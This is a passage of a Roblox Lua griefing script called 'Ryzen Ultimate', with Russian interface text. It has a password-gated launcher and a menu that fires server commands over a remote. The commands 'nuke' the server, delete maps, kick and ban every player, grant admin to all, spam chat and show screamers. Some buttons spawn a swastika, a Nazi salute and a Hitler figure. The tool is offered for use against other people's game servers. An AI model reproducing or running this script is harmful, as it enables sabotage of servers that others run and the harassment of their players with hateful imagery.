    elseif action == "replacemap" then doMapDestroy()
    elseif action == "nuke" then doNukeServer()
    elseif action == "giveadmin" then doGiveAdmin(plr)
    elseif action == "giveadminall" then doGiveAdminAll()
    elseif action == "giveitems" then doGiveItems(plr, data or "all")
    elseif action == "notify" then doGlobalNotify(data or "⚠️ ВНИМАНИЕ!", Color3.fromRGB(255,255,255), 8)
    elseif action == "godmode" then doGodMode(plr)
    elseif action == "kickall" then doKickAll(plr, data)
    elseif action == "banall" then doBanAll(plr)
    end
end)

-- ============================================================
-- 10. КРАСИВЫЙ ЛАУНЧЕР
-- ============================================================

local function createBeautifulLauncher()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "RyzenLauncher"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player.PlayerGui
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bg.BackgroundTransparency = 0.6
    bg.Parent = screenGui
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 500, 0, 400)
    mainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
    mainFrame.BackgroundColor3 = Color3.fromRGB(15, 10, 25)
    mainFrame.BackgroundTransparency = 1
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    
    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 20)
    mainCorner.Parent = mainFrame
    
    local neonLine = Instance.new("Frame")
    neonLine.Size = UDim2.new(0.8, 0, 0, 3)
    neonLine.Position = UDim2.new(0.1, 0, 0, 0)
    neonLine.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
    neonLine.BorderSizePixel = 0
    neonLine.Parent = mainFrame
    Instance.new("UICorner", neonLine).CornerRadius = UDim.new(0, 2)
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 70)
    title.Position = UDim2.new(0, 0, 0, 20)
    title.BackgroundTransparency = 1
    title.Text = "⚡ RYZEN ⚡"
    title.TextColor3 = Color3.fromRGB(0, 200, 255)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.Parent = mainFrame
    
    local subtitle = Instance.new("TextLabel")
    subtitle.Size = UDim2.new(1, 0, 0, 30)
    subtitle.Position = UDim2.new(0, 0, 0, 85)
    subtitle.BackgroundTransparency = 1
    subtitle.Text = "ВВЕДИТЕ ПАРОЛЬ ДЛЯ ДОСТУПА"
    subtitle.TextColor3 = Color3.fromRGB(180, 180, 200)
    subtitle.TextScaled = true
    subtitle.Font = Enum.Font.Gotham
    subtitle.Parent = mainFrame
    
    local passwordBox = Instance.new("TextBox")
    passwordBox.Size = UDim2.new(0.75, 0, 0, 50)
    passwordBox.Position = UDim2.new(0.125, 0, 0, 140)
    passwordBox.BackgroundColor3 = Color3.fromRGB(25, 20, 40)
    passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    passwordBox.Text = ""
    passwordBox.PlaceholderText = "🔑 Введите пароль..."
    passwordBox.Font = Enum.Font.Gotham
    passwordBox.TextScaled = true
    passwordBox.ClearTextOnFocus = false
    passwordBox.BorderSizePixel = 0
    passwordBox.Parent = mainFrame
    Instance.new("UICorner", passwordBox).CornerRadius = UDim.new(0, 10)
    
    local loginButton = Instance.new("TextButton")
    loginButton.Size = UDim2.new(0.4, 0, 0, 50)
    loginButton.Position = UDim2.new(0.3, 0, 0, 210)
    loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    loginButton.Text = "🔓 ВОЙТИ"
    loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    loginButton.TextScaled = true
    loginButton.Font = Enum.Font.GothamBold
    loginButton.BorderSizePixel = 0
    loginButton.Parent = mainFrame
    Instance.new("UICorner", loginButton).CornerRadius = UDim.new(0, 10)
    
    local loadFrame = Instance.new("Frame")
    loadFrame.Size = UDim2.new(0.7, 0, 0, 8)
    loadFrame.Position = UDim2.new(0.15, 0, 0, 280)
    loadFrame.BackgroundColor3 = Color3.fromRGB(30, 25, 45)
    loadFrame.BackgroundTransparency = 1
    loadFrame.Parent = mainFrame
    Instance.new("UICorner", loadFrame).CornerRadius = UDim.new(0, 4)
    
    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
    progressBar.BackgroundTransparency = 0
    progressBar.BorderSizePixel = 0
    progressBar.Parent = loadFrame
    Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 4)
    
    local loadText = Instance.new("TextLabel")
    loadText.Size = UDim2.new(1, 0, 0, 25)
    loadText.Position = UDim2.new(0, 0, 0, 295)
    loadText.BackgroundTransparency = 1
    loadText.Text = ""
    loadText.TextColor3 = Color3.fromRGB(150, 200, 255)
    loadText.TextScaled = true
    loadText.Font = Enum.Font.Gotham
    loadText.Parent = mainFrame
    
    local errorText = Instance.new("TextLabel")
    errorText.Size = UDim2.new(1, 0, 0, 30)
    errorText.Position = UDim2.new(0, 0, 0, 330)
    errorText.BackgroundTransparency = 1
    errorText.Text = ""
    errorText.TextColor3 = Color3.fromRGB(255, 50, 50)
    errorText.TextScaled = true
    errorText.Font = Enum.Font.Gotham
    errorText.Parent = mainFrame
    
    mainFrame.BackgroundTransparency = 1
    TweenService:Create(mainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0}):Play()
    
    local function startLoading(callback)
        loadFrame.BackgroundTransparency = 0
        loadText.Text = "🔐 ИНИЦИАЛИЗАЦИЯ..."
        progressBar.Size = UDim2.new(0, 0, 1, 0)
        
        local steps = 25
        local loadMessages = {
            "🔐 ИНИЦИАЛИЗАЦИЯ...",
            "📡 ПОДКЛЮЧЕНИЕ К СЕРВЕРУ...",
            "⚡ ДЕШИФРАЦИЯ ДАННЫХ...",
            "🛡️ АКТИВАЦИЯ ЗАЩИТЫ...",
            "🔥 ЗАГРУЗКА МОДУЛЕЙ...",
            "✅ ГОТОВО!"
        }
        
        for i = 1, steps do
            wait(0.04)
            local progress = i / steps
            progressBar.Size = UDim2.new(progress, 0, 1, 0)
            local msgIndex = math.min(math.floor(progress * #loadMessages) + 1, #loadMessages)
            loadText.Text = loadMessages[msgIndex] or loadText.Text
            if progress < 0.3 then
                progressBar.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
            elseif progress < 0.6 then
                progressBar.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
            else
                progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
            end
        end
        
        loadText.Text = "✅ ГОТОВО К РАБОТЕ!"
        wait(0.3)
        if callback then callback() end
    end
    
    loginButton.MouseButton1Click:Connect(function()
        local inputPass = passwordBox.Text
        if inputPass == PASSWORD then
            errorText.Text = ""
            loginButton.Text = "⏳ ЗАГРУЗКА..."
            loginButton.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
            
            startLoading(function()
                loginButton.Text = "✅ ДОБРО ПОЖАЛОВАТЬ!"
                loginButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
                wait(0.5)
                mainFrame:TweenSize(UDim2.new(0, 0, 0, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true)
                wait(0.3)
                screenGui:Destroy()
                createMainGUI()
            end)
        else
            errorText.Text = "❌ НЕВЕРНЫЙ ПАРОЛЬ!"
            passwordBox.Text = ""
            passwordBox:CaptureFocus()
            local shake = TweenService:Create(mainFrame, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
                Position = UDim2.new(0.5, -250 + math.random(-15,15), 0.5, -200)
            })
            shake:Play()
            wait(0.08)
            shake:Cancel()
            mainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
        end
    end)
    
    passwordBox.FocusLost:Connect(function(enterPressed)
        if enterPressed then loginButton.MouseButton1Click:Fire() end
    end)
end

-- ============================================================
-- 11. ОСНОВНОЕ МЕНЮ
-- ============================================================

local function createMainGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "RyzenGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player.PlayerGui
    
    local toggleButton = Instance.new("ImageButton")
    toggleButton.Size = UDim2.new(0, 65, 0, 65)
    toggleButton.Position = UDim2.new(0, 15, 0, 15)
    toggleButton.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    toggleButton.Image = "rbxassetid://13108746847"
    toggleButton.Parent = screenGui
    Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0, 12)
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 700, 0, 550)
    mainFrame.Position = UDim2.new(0.5, -350, 0.5, -275)
    mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
    mainFrame.BackgroundTransparency = 1
    mainFrame.Parent = screenGui
    mainFrame.Visible = false
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
    
    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, -20, 1, -80)
    scroll.Position = UDim2.new(0, 10, 0, 45)
    scroll.BackgroundTransparency = 1
    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    scroll.ScrollBarThickness = 6
    scroll.Parent = mainFrame
    
    local y = 0
    
    local function addCat(t,c)
        local l = Instance.new("TextLabel", scroll)
        l.Size = UDim2.new(0.9, 0, 0, 30)
        l.Position = UDim2.new(0.05, 0, 0, y)
        l.BackgroundColor3 = c
        l.Text = t
        l.TextColor3 = Color3.fromRGB(255,255,255)
        l.TextScaled = true
        l.Font = Enum.Font.GothamBold
        y = y + 40
        return y
    end
    
    local function addBtn(t,a,d)
        local b = Instance.new("TextButton", scroll)
        b.Size = UDim2.new(0.8, 0, 0, 35)
        b.Position = UDim2.new(0.1, 0, 0, y)
        b.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
        b.Text = t
        b.TextColor3 = Color3.fromRGB(200, 200, 255)
        b.TextScaled = true
        b.Font = Enum.Font.Gotham
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
        b.MouseButton1Click:Connect(function()
            if remote then
                if a == "notify" then
                    local input = Instance.new("TextBox")
                    input.Size = UDim2.new(0, 400, 0, 60)
                    input.Position = UDim2.new(0.5, -200, 0.5, -30)
                    input.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
                    input.TextColor3 = Color3.fromRGB(255,255,255)
                    input.TextScaled = true
                    input.Font = Enum.Font.Gotham
                    input.PlaceholderText = "Введите текст уведомления..."
                    input.Parent = screenGui
                    input.FocusLost:Connect(function(enterPressed)
                        if enterPressed and input.Text ~= "" then
                            remote:FireServer("notify", input.Text)
                            input:Destroy()
                        else
                            input:Destroy()
                        end
                    end)
                else
                    remote:FireServer(a, d or "")
                end
            end
        end)
        y = y + 42
        return y
    end
    
    -- Категории
    y = addCat("⚙️ ОСНОВНЫЕ", Color3.fromRGB(0,40,80))
    for _, v in pairs({
        {"Зига","zig"},
        {"Свастика","swastika"},
        {"Адское небо","hellsky"},
        {"Кровавое небо","bloodysky"},
        {"Телепорт","teleport"},
        {"Танк","tank"},
        {"Эффекты","effects"},
        {"Музыка","music"},
        {"Стоп муз","stopmusic"}
    }) do y = addBtn(v[1], v[2]) end
    y = y + 10
    
    y = addCat("🔫 ОРУЖИЕ", Color3.fromRGB(0,60,40))
    for _, v in pairs({
        {"AK-47 (себе)","giveak"},
        {"AK-47 (всем)","giveakall"},
        {"Убрать AK-47","removeakall"}
    }) do y = addBtn(v[1], v[2]) end
    y = y + 10
    
    y = addCat("👑 АДМИНКА", Color3.fromRGB(60,40,0))
    for _, v in pairs({
        {"Админка (себе)","giveadmin"},
        {"Админка (ВСЕМ)","giveadminall"}
    }) do y = addBtn(v[1], v[2]) end
    y = y + 10
    
    y = addCat("🗺️ КАРТА", Color3.fromRGB(0,60,80))
    for _, v in pairs({
        {"🗑️ Удалить карту","deletemap"},
        {"🌋 Создать карту","createmap"},
        {"🔄 Заменить карту","replacemap"},
        {"🌋 Адский ландшафт","hellmap"},
        {"💀 Кладбище","graveyard"},
        {"📐 Карта 1x1x1x1","onedotmap"}
    }) do y = addBtn(v[1], v[2]) end
    y = y + 10
    
    y = addCat("🧨 TROLL", Color3.fromRGB(100,0,0))
    for _, v in pairs({
        {"Танец (обыч)","dance","default"},
        {"Танец (робот)","dance","robot"},
        {"Танец (гангнам)","dance","gangnam"},
        {"Зомби","zombie"},
        {"Гитлер","hitler"},
        {"Кровавые текстуры","bloody"},
        {"Адская погода","hellweather"},
        {"Рандом-телепорт","randomtp"},
        {"Кров. монстр","bloodmonster"},
        {"Чат-спам","chatspam"},
        {"Скример всем","scareall"},
        {"Переворот экр","flipscreen"},
        {"Смена имён","renametroll"},
        {"Страшные эффекты","scaryeffects"}
    }) do y = addBtn(v[1], v[2], v[3]) end
    y = y + 10
    
    y = addCat("💀 СНОС", Color3.fromRGB(80,0,0))
    for _, v in pairs({
        {"💥 Снести СЕРВЕР","nuke"},
        {"Деньги","giveitems","money"},
        {"Оружие","giveitems","weapons"},
        {"Всё","giveitems","all"},
        {"Режим бога","godmode"},
        {"Уведомление","notify"},
        {"Кик всех","kickall"},
        {"Бан всех","banall"}
    }) do y = addBtn(v[1], v[2], v[3]) end
    
    scroll.CanvasSize = UDim2.new(0,0,0,y+30)
    
    local isOpen = false
    toggleButton.MouseButton1Click:Connect(function()
        isOpen = not isOpen
        if isOpen then
            mainFrame.Visible = true
            mainFrame:TweenSize(UDim2.new(0,700,0,550), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 0.3, true)
            mainFrame:TweenBackgroundTransparency(0, 0.3)
        else
            mainFrame:TweenSize(UDim2.new(0,0,0,0), Enum.EasingDirection.In, Enum.EasingStyle.Quad, 0.2, true)
            mainFrame:TweenBackgroundTransparency(1, 0.2)
            wait(0.25)
            mainFrame.Visible = false
        end
    end)
    
    createApocalypseMap()
    doGlobalNotify("🔥 RYZEN ULTIMATE АКТИВИРОВАН!", Color3.fromRGB(0,200,255), 3)
    print("✅ Ryzen Ultimate v11.0 ACTIVE")
    print("👹 1x1x1x1 in center")
    print("🔒 Пароль: ryzen2025")
end

-- ============================================================
-- 12. ЗАПУСК
-- ============================================================

createBeautifulLauncher()
